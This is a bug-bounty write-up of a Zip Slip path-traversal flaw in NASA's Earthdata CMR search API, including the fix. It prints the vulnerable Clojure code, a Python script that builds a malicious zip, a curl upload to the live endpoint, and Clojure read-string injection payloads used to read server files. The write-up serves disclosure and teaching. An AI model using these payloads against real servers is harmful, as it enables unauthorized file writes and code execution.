# I Wrote a File on a NASA Server With a 132-Byte Zip

- **Source URL:** https://obaskly.medium.com/i-wrote-a-file-on-a-nasa-server-with-a-132-byte-zip-41615320b5a5
- **Fetched from:** https://obaskly.medium.com/i-wrote-a-file-on-a-nasa-server-with-a-132-byte-zip-41615320b5a5?source=rss-5638f1c49663------2
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/14960 (id 14960)
- **Method:** medium-rss-feed (full content:encoded) readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
- **Author/Published (RSS):** Obaskly / Tue, 27 Oct 2026 05:35:27 GMT

A Zip Slip in NASA’s Earthdata search API, no login needed.

It was around 5 AM when my script printed this:

**FILE EXISTS! Content: “poc by obaskly”**

That file was on a **NASA production server**. I put it there by uploading a zip, without an account or any kind of auth.

**THE TARGET**

NASA’s Common Metadata Repository (CMR) at cmr.earthdata.nasa.gov is the search backend for Earthdata. It’s open source, so I spent my time reading code instead of guessing.

One feature stood out. You can search by uploading a shapefile, and shapefiles usually come as a zip. So the server takes a zip from anyone on the internet and extracts it. Naturally I wanted to see how.

**THE BUG**

The extraction code is in *search-app/src/cmr/search/services/parameters/converters/shapefile.clj*:

(defn unzip-file

\[source\]

(let \[target-dir (Files/createTempDirectory "Shapes" (into-array FileAttribute \[\]))\]

(with-open \[zip (ZipFile. source)\]

(let \[entries (enumeration-seq (.entries zip))

target-file #(File. (.toString target-dir) (str %))\]

(doseq \[entry entries :when (not (.isDirectory ^java.util.zip.ZipEntry entry))

:let \[f (target-file entry)\]\]

(io/copy (.getInputStream zip entry) f))))

(.toFile target-dir)))

It takes each entry name from the zip, sticks it onto the temp folder path and writes the file. Nothing checks the name. Java’s File doesn’t care about “..”, so an entry called ../poc.txt ends up at:

/tmp/Shapes12345/../poc.txt -> /tmp/poc.txt

Classic Zip Slip.

**EXPLOITING IT**

Making the zip took three lines of Python:

import zipfile

with zipfile.ZipFile("evil.zip", "w") as zf:

zf.writestr("../poc.txt", "poc by obaskly")

Then I uploaded it to the public search endpoint:

curl -X POST "https://cmr.earthdata.nasa.gov/search/collections.json" \

-F "shapefile=@evil.zip;type=application/shapefile+zip" \

-F "include\_facets=v2" \

-F "page\_size=1"

The server answered with a 400: “Incomplete shapefile: missing .shp file”. It doesn’t matter, though. The code extracts everything first and validates afterwards, so the file was already on disk by the time I got the error.

CMR sits behind a load balancer, so I sent the upload 20 times to hit every instance.

**PROVING IT**

Writing a file blind is easy. Proving you wrote it is the hard part, and without proof a bug like this usually gets closed as theoretical.

Luckily I had already found RCE on this same server (full writeup here: [https://obaskly.medium.com/hacking-nasa-without-a-login-how-one-clojure-function-gave-me-root-access-b1ccdc0684ac](https://obaskly.medium.com/hacking-nasa-without-a-login-how-one-clojure-function-gave-me-root-access-b1ccdc0684ac)). The facets\_size parameter went through Clojure’s read-string, which runs code inside #=(…). If the result was positive the server returned 200, and if it was negative it returned 400. That gave me a yes/no oracle.

To check the file existed:

#=(load-string “(if (.exists (java.io.File. \”/tmp/poc.txt\”)) 1 -1)”)

I got a 200. To read the file, I binary searched each character by subtracting a guess from its char code and checking the status:

#=(load-string “(- (int (nth (slurp \”/tmp/poc.txt\”) 0)) 63)”)

That’s about 7 requests per character. Here’s the full run:

\[\*\] Zip Slip PoC - NASA CMR Shapefile Upload

\[1\] Creating malicious zip (entry: ../poc.txt)…

Zip size: 132 bytes

\[2\] Uploading 20 times (covers load-balanced instances)…

Accepted: 20/20

\[3\] Verifying /tmp/poc.txt exists on server…

FILE EXISTS! Content: "poc by obaskly"

\[+\] SUCCESS - Zip Slip confirmed. File written outside extraction directory.

I used the RCE only to read the file, never to write it, and I reported the two bugs separately. They live in different code paths, and fixing the RCE would have done nothing about the Zip Slip.

IMPACT

The service ran as root, so I could pick any path and any contents. Overwriting the app’s JARs, dropping a cron job or editing system files would all have been possible, and that gets you to code execution pretty quickly. If the Docker socket was mounted, a container escape too. I reported it as High.

THE FIX

Resolve the real path and make sure it’s still inside the temp folder:

(let \[canonical (.getCanonicalPath (File. (.toString target-dir) (str entry)))\]

(when-not (.startsWith canonical (.getCanonicalPath (.toFile target-dir)))

(throw (Exception. “Zip entry attempts path traversal”))))

Not running the service as root would also have limited the damage a lot.

**TAKEAWAYS**

\- If something unzips user uploads, check it. Zip Slip has been public since 2018 and it still turns up.

- A 400 doesn’t mean nothing happened. Look at what the server did before it errored out.

- Hang on to your old bugs. My RCE is what made this one provable.

I only wrote one harmless text file to /tmp and cleaned up after testing. Thanks to the NASA security team for handling the report.
